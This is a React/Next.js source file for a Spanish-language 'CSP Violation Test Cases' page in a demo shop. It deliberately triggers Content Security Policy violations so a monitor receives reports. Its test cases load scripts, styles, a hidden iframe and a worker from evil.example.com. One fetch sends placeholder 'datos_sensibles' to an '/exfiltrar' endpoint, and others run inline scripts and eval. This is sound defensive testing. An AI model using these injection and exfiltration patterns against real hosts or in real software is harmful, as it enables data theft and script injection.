"use client";

import { useState } from "react";
import Link from "next/link";

const DOMINIO_NO_AUTORIZADO = "https://evil.example.com";

const CASOS = [
	{
		id: "xss-externo",
		title: "XSS (Script externo)",
		desc: "Prueba la carga de scripts desde dominios no autorizados.",
		run: () => {
			const script = document.createElement("script");
			script.src = `${DOMINIO_NO_AUTORIZADO}/malicious.js`;
			document.body.appendChild(script);
		},
	},
	{
		id: "xss-inline",
		title: "XSS (Script inline)",
		desc: "Prueba la ejecución de scripts inline sin nonce.",
		run: () => {
			const script = document.createElement("script");
			script.textContent = "window.__csp_inline_test = true;";
			document.body.appendChild(script);
		},
	},
	{
		id: "exfiltracion",
		title: "Exfiltración de datos",
		desc: "Prueba intentos de conexión a dominios externos no autorizados.",
		run: () => {
			fetch(`${DOMINIO_NO_AUTORIZADO}/exfiltrar?d=${encodeURIComponent("datos_sensibles")}`).catch(() => {});
		},
	},
	{
		id: "eval",
		title: "Uso de eval()",
		desc: "Prueba el uso de eval() cuando no está permitido.",
		run: () => {
			eval("1+1");
		},
	},
	{
		id: "estilo-malicioso",
		title: "Inyección de estilo malicioso",
		desc: "Prueba la carga de estilos desde dominios no autorizados.",
		run: () => {
			const link = document.createElement("link");
			link.rel = "stylesheet";
			link.href = `${DOMINIO_NO_AUTORIZADO}/malicious.css`;
			document.head.appendChild(link);
		},
	},
	{
		id: "iframe-malicioso",
		title: "Iframe malicioso",
		desc: "Prueba la carga de iframes desde dominios no autorizados.",
		run: () => {
			const iframe = document.createElement("iframe");
			iframe.src = DOMINIO_NO_AUTORIZADO;
			iframe.style.cssText = "width:1px;height:1px;border:0;position:absolute;left:-9999px;";
			document.body.appendChild(iframe);
		},
	},
	{
		id: "xss-data-url",
		title: "XSS basado en URLs data",
		desc: "Prueba el uso de data: URLs para evitar restricciones.",
		run: () => {
			const script = document.createElement("script");
			script.src = "data:text/javascript,window.__csp_data_url_test=1";
			document.body.appendChild(script);
		},
	},
	{
		id: "worker-malicioso",
		title: "Worker malicioso",
		desc: "Prueba la carga de web workers desde dominios no autorizados.",
		run: () => {
			// Intencional: el Worker se instancia solo para disparar la violación CSP (worker-src)
			void new Worker(`${DOMINIO_NO_AUTORIZADO}/worker.js`);
		},
	},
	{
		id: "nonce-invalido",
		title: "Nonce o hash inválidos",
		desc: "Prueba la validez de los nonces o hashes utilizados en la política CSP.",
		run: () => {
			const script = document.createElement("script");
			script.setAttribute("nonce", "nonce-invalido-12345");
			script.textContent = "window.__csp_nonce_test = true;";
			document.body.appendChild(script);
		},
	},
	{
		id: "mime-type",
		title: "Manejo incorrecto de MIME-type (Working on it)",
		desc: "Prueba el uso de recursos con tipo MIME incorrecto.",
		run: () => {
			const script = document.createElement("script");
			script.src = "data:text/plain;base64,d2luZG93Ll9fY3NwX21pbWVfdGVzdD0x";
			script.type = "text/javascript";
			document.body.appendChild(script);
		},
	},
	{
		id: "clickjacking",
		title: "Clickjacking (Working on it)",
		desc: "Prueba la carga de frame ancestors.",
		run: () => {
			// El test de clickjacking se vería cuando esta página se carga dentro de un iframe
			// en un dominio no permitido por frame-ancestors. Aquí simulamos intentar abrir
			// en un contexto de frame no permitido (el reporte se genera al cargar esta app en iframe externo).
			// Mostramos mensaje informativo.
			const msg = document.createElement("p");
			msg.className = "csp-test-info";
			msg.textContent = "Para probar clickjacking: incrusta esta URL en un iframe desde otro origen. frame-ancestors bloqueará y generará el reporte CSP.";
			msg.style.cssText = "margin-top:8px;padding:8px;background:#fff3cd;border-radius:6px;font-size:14px;";
			const card = document.querySelector(`[data-test-id="clickjacking"]`);
			if (card) card.appendChild(msg);
		},
	},
];

export default function CSPTestsPage() {
	const [resultado, setResultado] = useState(null);
	const [ejecutando, setEjecutando] = useState(null);

	const ejecutar = (caso) => {
		setEjecutando(caso.id);
		setResultado(null);
		try {
			caso.run();
			setResultado({
				ok: true,
				texto: `Escenario "${caso.title}" ejecutado. Si la CSP lo bloquea, se enviará un reporte al monitor.`,
			});
		} catch (e) {
			setResultado({
				ok: false,
				texto: `Error: ${e.message}`,
			});
		}
		setTimeout(() => setEjecutando(null), 800);
	};

	return (
		<div className="container">
			<header style={{ marginBottom: "24px" }}>
				<Link href="/" className="logo" style={{ textDecoration: "none", color: "inherit" }}>
					<i className="fas fa-shopping-bag icon-spacing-lg"></i>
					Simple<span>Shop</span>
				</Link>
				<Link href="/" className="csp-back-link">
					<i className="fas fa-arrow-left"></i> Volver a la tienda
				</Link>
			</header>

			<main className="csp-tests-main">
				<section className="csp-tests-hero">
					<h1>CSP Violation Test Cases</h1>
					<p className="csp-tests-intro">Selecciona uno de los siguientes escenarios para generar reportes CSP específicos:</p>
				</section>

				<div className="csp-tests-grid">
					{CASOS.map((caso) => (
						<div key={caso.id} className="csp-test-card" data-test-id={caso.id}>
							<div className="csp-test-number">{CASOS.indexOf(caso) + 1}</div>
							<h3 className="csp-test-title">{caso.title}</h3>
							<p className="csp-test-desc">{caso.desc}</p>
							<button type="button" className="csp-test-btn" onClick={() => ejecutar(caso)} disabled={ejecutando === caso.id}>
								{ejecutando === caso.id ? (
									<>
										<i className="fas fa-spinner fa-spin"></i> Ejecutando...
									</>
								) : (
									<>
										<i className="fas fa-play"></i> Generar reporte CSP
									</>
								)}
							</button>
						</div>
					))}
				</div>

				{resultado && (
					<div className={`csp-result ${resultado.ok ? "csp-result-ok" : "csp-result-error"}`}>
						{resultado.ok ? <i className="fas fa-check-circle"></i> : <i className="fas fa-exclamation-triangle"></i>}
						<span>{resultado.texto}</span>
					</div>
				)}
			</main>

			<footer style={{ marginTop: "40px", paddingTop: "20px", borderTop: "1px solid #eaeaea", color: "#636e72", fontSize: "14px" }}>
				<p>© 2026 SimpleShop. Casos de prueba CSP para Firstoken Monitor.</p>
			</footer>
		</div>
	);
}
